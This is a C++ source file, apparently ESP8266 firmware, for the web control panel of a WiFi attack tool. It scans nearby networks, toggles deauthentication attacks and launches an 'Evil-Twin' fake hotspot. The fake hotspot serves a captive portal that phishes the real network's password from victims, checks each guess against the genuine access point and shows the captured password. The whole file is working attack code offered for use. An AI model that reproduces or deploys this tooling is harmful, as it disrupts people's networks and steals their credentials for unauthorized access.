#include "WebServ.h"

WebServ::WebServ() : webServer(80), hotspot_active(false), deauthing_active(false), _correct(""), _tryPassword("")
{
    _tempHTML = Utils::getTempHTML();
}

void WebServ::setupServer()
{
    Serial.begin(115200);
    Serial.println("Setup started");

    WiFi.mode(WIFI_AP_STA);
    wifi_promiscuous_enable(1);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Deauther", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    webServer.on("/", std::bind(&WebServ::handleIndex, this));
    webServer.on("/result", std::bind(&WebServ::handleResult, this));
    webServer.onNotFound(std::bind(&WebServ::handleIndex, this));
    webServer.begin();
}

void WebServ::handleClient()
{
    dnsServer.processNextRequest();
    webServer.handleClient();
}

void WebServ::handleResult()
{
    if (WiFi.status() != WL_CONNECTED)
    {
        webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
        Serial.println("Wrong password tried !");
    }
    else
    {
        webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
        hotspot_active = false;
        deauthing_active = false;
        dnsServer.stop();
        int n = WiFi.softAPdisconnect(true);
        Serial.println(String(n));
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        WiFi.softAP("Deauther", "deauther");
        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
        _correct = "Successfully got password for: " + selectedNetwork.ssid + " Password: " + _tryPassword;
        Serial.println("Good password was entered !");
        Serial.println(_correct);
    }
}

void WebServ::handleIndex()
{
    if (webServer.hasArg("scan"))
    {
        scanAp.performScan();
    }

    if (webServer.hasArg("ap"))
    {
        for (int i = 0; i < scanAp.getNetworkCount(); i++)
        {
            if (Utils::bytesToStr(scanAp.getNetwork(i).bssid, 6) == webServer.arg("ap"))
            {
                selectedNetwork = scanAp.getNetwork(i);
            }
        }
    }

    if (webServer.hasArg("deauth"))
    {
        if (webServer.arg("deauth") == "start")
        {
            deauthing_active = true;
        }
        else if (webServer.arg("deauth") == "stop")
        {
            deauthing_active = false;
        }
    }

    if (webServer.hasArg("hotspot"))
    {
        if (webServer.arg("hotspot") == "start")
        {
            hotspot_active = true;
            evilTwin.startEvilTwin(selectedNetwork.ssid);
        }
        else if (webServer.arg("hotspot") == "stop")
        {
            hotspot_active = false;
            evilTwin.stopEvilTwin();
        }
        return;
    }

    if (hotspot_active == false)
    {
        String _html = _tempHTML;

        for (int i = 0; i < scanAp.getNetworkCount(); ++i)
        {
            if (scanAp.getNetwork(i).ssid == "")
            {
                break;
            }
            _html += "<tr><td>" + scanAp.getNetwork(i).ssid + "</td><td>" + String(scanAp.getNetwork(i).ch) + "</td><td>" + String(scanAp.getNetwork(i).rssi) + "<td><form method='post' action='/?ap=" + Utils::bytesToStr(scanAp.getNetwork(i).bssid, 6) + "'>";

            if (Utils::bytesToStr(selectedNetwork.bssid, 6) == Utils::bytesToStr(scanAp.getNetwork(i).bssid, 6))
            {
                _html += "<button style='background-color: #0ba8cf; color:black;'>Selected</button></form></td></tr>";
            }
            else
            {
                _html += "<button>Select</button></form></td></tr>";
            }
        }

        if (deauthing_active)
        {
            _html.replace("{deauth_button}", "Stop Deauth");
            _html.replace("{deauth}", "stop");
        }
        else
        {
            _html.replace("{deauth_button}", "Start Deauth");
            _html.replace("{deauth}", "start");
        }

        if (hotspot_active)
        {
            _html.replace("{hotspot_button}", "Stop Evil-Twin");
            _html.replace("{hotspot}", "stop");
        }
        else
        {
            _html.replace("{hotspot_button}", "Start Evil-Twin");
            _html.replace("{hotspot}", "start");
        }

        if (selectedNetwork.ssid == "")
        {
            _html.replace("{disabled}", " disabled");
        }
        else
        {
            _html.replace("{disabled}", "");
        }

        _html += "</table><br><hr><br>";

        if (_correct != "")
        {
            _html += "<h1>Results</h1></br><h3>" + _correct + "</h3>";
        }

        _html += "</div></body></html>";
        webServer.send(200, "text/html", _html);
    }
    else
    {
        if (webServer.hasArg("password"))
        {
            _tryPassword = webServer.arg("password");
            WiFi.disconnect();
            WiFi.begin(selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), selectedNetwork.ch, selectedNetwork.bssid);
            webServer.send(200, "text/html", posted());
        }
        else
        {
            webServer.send(200, "text/html", index());
        }
    }
}

String WebServ::header(String t)
{
    return Utils::getHeaderHTML(t, selectedNetwork.ssid, SUBTITLE);
}

String WebServ::index()
{
    return header(TITLE) + Utils::getIndexHTML() + footer();
}

String WebServ::posted()
{
    return header(POST_TITLE) + Utils::getPostedHTML() + footer();
}

String WebServ::footer()
{
    return Utils::getFooterHTML();
}

bool WebServ::isDeauthingActive() const
{
    return deauthing_active;
}

Deauth &WebServ::getDeauth()
{
    return deauth;
}

ScanAp::Network WebServ::getSelectedNetwork() const
{
    return selectedNetwork;
}

ScanAp &WebServ::getScanAp()
{
    return scanAp;
}